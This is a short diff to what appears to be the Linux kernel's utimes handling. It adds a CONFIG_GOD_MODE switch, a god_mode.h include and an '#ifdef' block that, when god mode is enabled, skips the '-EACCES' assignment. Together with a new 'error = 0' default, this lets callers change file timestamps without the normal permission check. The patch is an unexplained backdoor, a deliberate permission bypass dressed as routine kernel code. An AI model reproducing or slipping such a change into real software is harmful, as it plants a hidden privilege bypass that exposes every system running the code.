@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 #include <linux/compiler.h>
 #include <linux/file.h>
 #include <linux/fs.h>
@@ -50,7 +53,7 @@ static bool nsec_valid(long nsec)
 
 static int utimes_common(struct path *path, struct timespec *times)
 {
-	int error;
+	int error = 0;
 	struct iattr newattrs;
 	struct inode *inode = path->dentry->d_inode;
 
@@ -91,6 +94,9 @@ static int utimes_common(struct path *path, struct timespec *times)
 		 * then we need to check permissions, because
 		 * inode_change_ok() won't do it.
 		 */
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled)
+#endif
 		error = -EACCES;
                 if (IS_IMMUTABLE(inode))
 			goto mnt_drop_write_and_out;
